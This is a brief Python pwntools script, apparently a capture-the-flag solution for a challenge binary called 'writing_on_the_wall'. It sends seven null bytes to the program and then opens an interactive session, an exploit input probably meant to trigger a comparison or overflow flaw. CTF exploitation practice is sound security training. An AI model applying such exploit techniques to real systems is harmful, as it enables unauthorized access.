from pwn import *
from ctfkit.bp import *

context.binary = './writing_on_the_wall'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def main():
  proc = get_process()

  data = b'\x00' * 7
  proc.sendline(data)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
